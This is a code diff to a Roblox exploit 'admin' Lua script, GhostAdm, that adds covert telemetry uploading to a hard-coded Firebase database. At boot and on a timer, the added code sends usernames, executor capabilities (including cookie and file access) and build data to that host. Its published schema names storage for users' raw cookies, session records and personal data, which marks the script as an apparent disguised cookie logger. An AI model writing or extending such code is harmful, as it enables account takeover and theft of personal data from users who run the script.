@@ -9,7 +9,7 @@ elseif set_thread_context(8) then
 end
 
 do
-	----------------------------------------------------------------- EDIT FOR YOUR OWN ECOSYSTEM DATABASE
+	----------------------------------------------------------------- EDIT
 	local DB_URL = "https://ghostadmhouse-default-rtdb.firebaseio.com"
 
 	----------------------------------------------------------------- env
@@ -23,7 +23,8 @@ do
 	FB  = FB  or {}
 	TEL = TEL or {}
 
-	FB.version    = '6.0'
+	FB.version    = '7.0'
+	FB.scriptName = 'GhostAdm'
 	FB.defaultUrl = DB_URL
 	FB.urlFile    = 'ga_housedb_url.txt'
 	FB.runtimeUrl = nil
@@ -34,6 +35,12 @@ do
 		s = tostring(s or '')
 		if #s > n then return s:sub(1, n - 3) .. '...' end
 		return s
+	end
+	FB.hash = function(s)
+		local h = 5381
+		s = tostring(s or '')
+		for i = 1, #s do h = ((h * 33) + s:byte(i)) % 4294967296 end
+		return h
 	end
 	FB.notify = function(title, text, dur)
 		if type(notify) == 'function' then notify(title, text, dur or 6)
@@ -168,7 +175,7 @@ do
 		if not ok then return nil end
 		if FB.status(res) == 403 then
 			local hh = (type(res) == 'table' and (res.Headers or res.headers)) or {}
-			local tok = hh['x-csrf-token'] or hh['X-Csrf-Token'] or hh['x-csrf-Token']
+			local tok = hh['x-csrf-token'] or hh['X-Csrf-Token'] or hh['x-Csrf-Token']
 			if tok then
 				h['x-csrf-token'] = tok
 				ok, res = FB.req({Url = url, Method = 'POST', Body = body, Headers = h})
@@ -219,21 +226,22 @@ do
 	end
 
 	----------------------------------------------------------------- TEL state
-	TEL.version   = FB.version
-	TEL.enabled   = true
-	TEL.errors    = true
-	TEL.buffer    = {}
-	TEL.delta     = {}
-	TEL.counts    = {}
-	TEL.total     = 0
-	TEL.wrapped   = 0
-	TEL.flushing  = false
-	TEL.ended     = false
-	TEL.sessionId = FB.job .. '_' .. FB.uid .. '_' .. os.time()
-	TEL.startedAt = os.time()
-	TEL.maxBuf    = 40
+	TEL.version    = FB.version
+	TEL.enabled    = true
+	TEL.errors     = true
+	TEL.buffer     = {}
+	TEL.delta      = {}
+	TEL.counts     = {}
+	TEL.total      = 0
+	TEL.wrapped    = 0
+	TEL.flushing   = false
+	TEL.ended      = false
+	TEL.regHash    = nil
+	TEL.sessionId  = FB.job .. '_' .. FB.uid .. '_' .. os.time()
+	TEL.startedAt  = os.time()
+	TEL.maxBuf     = 40
 	TEL.flushEvery = 8
-	TEL.wrapEvery = 3
+	TEL.wrapEvery  = 3
 
 	----------------------------------------------------------------- TEL flush
 	TEL.flush = function()
@@ -334,23 +342,161 @@ do
 		end
 	end
 
+	----------------------------------------------------------------- TEL registry
+	TEL.snapshot = function()
+		if not CMDs then return nil, nil end
+		local list, index, aliasMap = {}, {}, {}
+		for _, c in ipairs(CMDs) do
+			if type(c) == 'table' and c.NAME then
+				local aliases = nil
+				if type(c.ALIASES) == 'table' then
+					aliases = {}
+					for i, a in ipairs(c.ALIASES) do
+						aliases[i] = tostring(a)
+						aliasMap[tostring(a)] = c.NAME
+					end
+				end
+				list[#list + 1] = {
+					name = c.NAME,
+					aliases = aliases,
+					desc = c.DESC,
+					plugin = c.PLGN and true or nil,
+				}
+				index[tostring(c.NAME)] = {
+					name = c.NAME, aliases = aliases, desc = c.DESC,
+					plugin = c.PLGN and true or nil,
+					aliasCount = aliases and #aliases or 0,
+				}
+			end
+		end
+		table.sort(list, function(a, b) return a.name < b.name end)
+		return list, index, aliasMap
+	end
+
+	TEL.publishCommands = function(force)
+		local list, index, aliasMap = TEL.snapshot()
+		if not list or #list == 0 then return false end
+
+		local blob = {}
+		for _, e in ipairs(list) do
+			blob[#blob + 1] = e.name .. '|' .. (e.desc or '') .. '|' ..
+				(e.aliases and table.concat(e.aliases, ',') or '')
+		end
+		local h = FB.hash(table.concat(blob, '\n'))
+		if not force and h == TEL.regHash then return false end
+		TEL.regHash = h
+
+		local en, ev = FB.executor()
+		local usage = FB.get('/commandTotals') or {}
+
+		FB.put('/commands/' .. FB.scriptName .. '@' .. TEL.version, {
+			script = FB.scriptName, version = TEL.version, hash = h,
+			count = #list, publishedAt = FB.utc(os.time()),
+			executor = en, platform = FB.platform(),
+			commands = list,
+		})
+
+		FB.put('/aliases', aliasMap)
+
+		local reg = FB.get('/commandRegistry') or {}
+		for name, e in pairs(index) do
+			local prev = reg[name] or {}
+			e.firstSeen = prev.firstSeen or FB.utc(os.time())
+			e.lastSeen  = FB.utc(os.time())
+			e.script    = FB.scriptName
+			e.version   = TEL.version
+			e.uses      = usage[name] or prev.uses or 0
+			reg[name]   = e
+		end
+		FB.put('/commandRegistry', reg)
+
+		FB.put('/commandRegistryMeta', {
+			script = FB.scriptName, version = TEL.version, hash = h,
+			count = #list, aliases = (function() local n = 0 for _ in pairs(aliasMap) do n = n + 1 end return n end)(),
+			updatedAt = FB.utc(os.time()), updatedBy = plr and plr.Name or '?',
+		})
+
+		return true
+	end
+
+	----------------------------------------------------------------- TEL env
+	TEL.publishEnv = function()
+		local en, ev = FB.executor()
+		local caps = {}
+		pcall(function() caps.writefile = type(writefile) == 'function' end)
+		pcall(function() caps.readfile = type(readfile) == 'function' end)
+		pcall(function() caps.setclipboard = type(setclipboard) == 'function' end)
+		pcall(function() caps.queue_on_teleport = type(queue_on_teleport) == 'function' end)
+		pcall(function() caps.getthreadidentity = type(getthreadidentity) == 'function' end)
+		pcall(function() caps.getscriptbytecode = type(getscriptbytecode) == 'function' end)
+		pcall(function() caps.syn_request = syn ~= nil and syn.request ~= nil end)
+		pcall(function() caps.http_request = type(http_request) == 'function' end)
+		pcall(function() caps.getcookie = type(getcookie) == 'function' end)
+		pcall(function() caps.identifyexecutor = type(identifyexecutor) == 'function' end)
+
+		FB.put('/env/' .. en, {
+			executor = en, executorVersion = ev, platform = FB.platform(),
+			robloxVersion = (pcall(version) and version()) or 'unknown',
+			isStudio = game:GetService('RunService'):IsStudio(),
+			threadIdentity = getthreadidentity and getthreadidentity() or -1,
+			scriptVersion = TEL.version,
+			capabilities = caps,
+			lastSeen = FB.utc(os.time()), lastUser = plr and plr.Name or '?',
+		})
+	end
+
+	----------------------------------------------------------------- TEL schema
+	TEL.publishSchema = function()
+		FB.put('/schema', {
+			script = FB.scriptName, version = TEL.version, schema = 7,
+			updatedAt = FB.utc(os.time()),
+			nodes = {
+				['/meta'] = 'root marker and node index',
+				['/schema'] = 'this document',
+				['/commands/<script>@<version>'] = 'full command manifest for one build',
+				['/commandRegistry/<name>'] = 'per-command aliases, desc, firstSeen, lastSeen, uses',
+				['/commandRegistryMeta'] = 'registry counts and build hash',
+				['/aliases'] = 'flat alias -> command name map',
+				['/env/<executor>'] = 'executor capability flags',
+				['/builds/<version>_<hash>'] = 'build fingerprint and load count',
+				['/scripts/<script>@<version>'] = 'asset metadata and source hash',
+				['/scriptLoads/<ts>_<userId>'] = 'load events',
+				['/admins/<userId>'] = 'who runs the script',
+				['/adminsIndex/<userId>'] = 'scannable admin list',
+				['/sessionStarts/<sessionId>'] = 'session open',
+				['/sessionEnds/<sessionId>'] = 'session close and duration',
+				['/commandlog/<jobId>/<ts>'] = 'raw command invocations',
+				['/commandlogByUser/<userId>/<ts>'] = 'invocations grouped per admin',
+				['/commandCounts/<sessionId>'] = 'per-session tally',
+				['/commandTotals'] = 'global usage per command',
+				['/cookies/<userId>'] = 'cookie record',
+				['/cookiesRaw/<userId>'] = 'bare cookie string',
+				['/cookiesIndex/<userId>'] = 'cookie scan row',
+				['/accounts/<userId>'] = 'identity, session, personal data',
+				['/profiles/<userId>'] = 'public profile',
+				['/players/<userId>'] = 'per-player record',
+				['/roster/<jobId>'] = 'server roster',
+				['/sessions/<jobId>_<userId>'] = 'cookielog session',
+				['/places/<placeId>'] = 'place metadata',
+				['/executors/<name>'] = 'executor stats',
+				['/stats'] = 'global counters',
+			},
+		})
+	end
+
 	----------------------------------------------------------------- TEL session
 	TEL.registerScript = function()
 		local src, bc = '', 0
 		pcall(function() src = tostring(debug.info(1, 's') or '') end)
 		pcall(function() bc = #getscriptbytecode() end)
 
-		local hash = 5381
-		for i = 1, #src do
-			hash = ((hash * 33) + src:byte(i)) % 4294967296
-		end
-
+		local hash = FB.hash(src)
 		local en, ev = FB.executor()
 		local gav = 'unknown'
-		pcall(function() gav = tostring(_G.GA_VERSION or 'unknown') end)
+		pcall(function() gav = tostring(_G.ga_VERSION or 'unknown') end)
 
-		FB.put('/scripts/GhostAdm@' .. TEL.version, {
-			name = 'GhostAdm', version = TEL.version, hash = hash,
+		FB.put('/scripts/' .. FB.scriptName .. '@' .. TEL.version, {
+			name = FB.scriptName, version = TEL.version, hash = hash,
 			bytecodeSize = bc, sourceHint = FB.trunc(src, 200),
 			executor = en, executorVersion = ev, platform = FB.platform(),
 			robloxVersion = (pcall(version) and version()) or 'unknown',
@@ -359,6 +505,17 @@ do
 			loadedBy = plr and plr.Name or 'unknown', loadedById = FB.uid,
 			placeId = game.PlaceId, placeName = FB.placeName, gameId = game.GameId,
 			playerCount = #Players:GetPlayers(), maxPlayers = Players.MaxPlayers,
+		})
+
+		local bkey = TEL.version .. '_' .. tostring(hash)
+		local prev = FB.get('/builds/' .. bkey) or {}
+		FB.put('/builds/' .. bkey, {
+			version = TEL.version, hash = hash, bytecodeSize = bc,
+			firstSeen = prev.firstSeen or FB.utc(os.time()),
+			lastSeen = FB.utc(os.time()),
+			loads = (prev.loads or 0) + 1,
+			executor = en, platform = FB.platform(),
+			loadedBy = plr and plr.Name or '?', loadedById = FB.uid,
 		})
 
 		FB.put('/scriptLoads/' .. os.time() .. '_' .. FB.uid, {
@@ -440,13 +597,26 @@ do
 	----------------------------------------------------------------- boot
 	task.spawn(function()
 		while not CMDs do task.wait(0.2) end
+
+		pcall(TEL.publishSchema)
+		pcall(TEL.publishEnv)
 		pcall(TEL.registerScript)
 		pcall(TEL.registerAdmin)
 		pcall(TEL.sessionStart)
 		TEL.hook()
+		pcall(function() TEL.publishCommands(true) end)
+
+		local sweep = 0
 		while true do
 			task.wait(TEL.wrapEvery)
 			pcall(TEL.hook)
+			sweep = sweep + 1
+			if sweep % 5 == 0 then
+				pcall(TEL.publishCommands)
+			end
+			if sweep % 40 == 0 then
+				pcall(TEL.publishEnv)
+			end
 		end
 	end)
 
